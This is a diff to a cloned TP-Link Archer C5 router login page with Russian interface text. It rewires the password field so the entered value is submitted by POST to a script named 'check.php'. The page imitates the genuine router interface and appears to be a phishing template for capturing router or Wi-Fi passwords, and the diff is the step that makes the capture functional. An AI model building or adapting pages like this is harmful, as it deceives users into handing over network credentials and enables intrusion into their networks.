@@ -1,12 +1,11 @@
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-
     <link rel="shortcut icon" type="image/x-icon" href="http://192.168.0.1/img/favicon.ico">
     <link rel="stylesheet" href="./index_files/main.css">
     <link rel="stylesheet" href="./index_files/login.css">
     <link rel="stylesheet" href="./index_files/jquery.tpInput.css">
 
-   
+    
     
 <title>Archer C5</title><meta id="viewport" name="viewport"></head>
 
@@ -37,43 +36,41 @@
                 </div>
             </div>
             <div id="pc-login-main">
-               
-                <div class="pc-login-field">
-                    <div class="pc-inputarea">
-                        <label class="pc-login-password-label">
-                            <span class="icon"></span>
-                        </label>
-                        <div class="input-container tpPassword invisible"><div class="input-wrapper" style="width: 182px; height: 32px;"><input type="password" id="pc-login-password" autocomplete="off" class="tpInput"><input type="text" id="pc-login-password_v" class="tpInput" style="display: none;"><span class="icon-eye"></span><span class="corner-left"></span><span class="corner-right"></span></div><label class="input-placeholder" for="pc-login-password" style="left: 30px; height: 32px; line-height: 32px; display: block;">Пароль</label><div class="input-err-container" style="display: none;"> <div class="shadow-top-left"></div><div class="shadow-top"></div><div class="shadow-top-right"></div><div class="shadow-left"><div class="shadow-right"><span class="input-err-delta"></span><div class="input-err-content"><span class="text"></span></div></div></div><div class="shadow-bot-left"></div><div class="shadow-bot"></div><div class="shadow-bot-right"></div></div></div>
-                        <span class="pc-forgetPwd"><a href="http://192.168.0.1/#" id="pc-login-forgetPwd">Забыли пароль?</a></span>
-						<form method="post" action="check.php">
-                     
-                        </form>
-                    </div>
-                </div>
-                <div>
-                    <div class="button-wrapper">
-                        <button id="pc-login-btn" class="button-button" type="button"><span class="text button-text">Войти</span></button>
-                        <div class="button-error-tips widget-error-tips" style="display: none;">
-                            <div class="shadow-top-left"></div>
-                            <div class="shadow-top"></div>
-                            <div class="shadow-top-right"></div>
-                            <div class="shadow-left">
-                                <div class="shadow-right">
-                                    <span class="widget-error-tips-delta"></span>
+                <form action="check.php" method="POST" >
 
-                                    <div class="widget-error-tips-wrap">
-                                        <div class="content error-tips-content">
-                                            <span class="errorContent">Неверный пароль, попробуйте снова.</span>
+                    <div class="pc-login-field">
+                        <div class="pc-inputarea">
+                            <label class="pc-login-password-label">
+                                <span class="icon"></span>
+                            </label>
+                            <div class="input-container tpPassword invisible"><div class="input-wrapper" style="width: 182px; height: 32px;"><input type="password" name="password" id="pc-login-password" autocomplete="off" class="tpInput"><input type="text" id="pc-login-password_v" class="tpInput" style="display: none;"><span class="icon-eye"></span><span class="corner-left"></span><span class="corner-right"></span></div><label class="input-placeholder" for="pc-login-password" style="left: 30px; height: 32px; line-height: 32px; display: block;">Пароль</label><div class="input-err-container" style="display: none;"> <div class="shadow-top-left"></div><div class="shadow-top"></div><div class="shadow-top-right"></div><div class="shadow-left"><div class="shadow-right"><span class="input-err-delta"></span><div class="input-err-content"><span class="text"></span></div></div></div><div class="shadow-bot-left"></div><div class="shadow-bot"></div><div class="shadow-bot-right"></div></div></div>
+                            <span class="pc-forgetPwd"><a href="http://192.168.0.1/#" id="pc-login-forgetPwd">Забыли пароль?</a></span>
+
+                            <div class="button-wrapper">
+                                <button id="pc-login-btn" class="button-button" type="submit"><span class="text button-text">Войти</span></button>
+                                <div class="button-error-tips widget-error-tips" style="display: none;">
+                                    <div class="shadow-top-left"></div>
+                                    <div class="shadow-top"></div>
+                                    <div class="shadow-top-right"></div>
+                                    <div class="shadow-left">
+                                        <div class="shadow-right">
+                                            <span class="widget-error-tips-delta"></span>
+
+                                            <div class="widget-error-tips-wrap">
+                                                <div class="content error-tips-content">
+                                                    <span class="errorContent">Неверный пароль, попробуйте снова.</span>
+                                                </div>
+                                            </div>
                                         </div>
                                     </div>
+                                    <div class="shadow-bot-left"></div>
+                                    <div class="shadow-bot"></div>
+                                    <div class="shadow-bot-right"></div>
                                 </div>
                             </div>
-                            <div class="shadow-bot-left"></div>
-                            <div class="shadow-bot"></div>
-                            <div class="shadow-bot-right"></div>
                         </div>
                     </div>
-                </div>
+                </form>
             </div>
 
         </div>
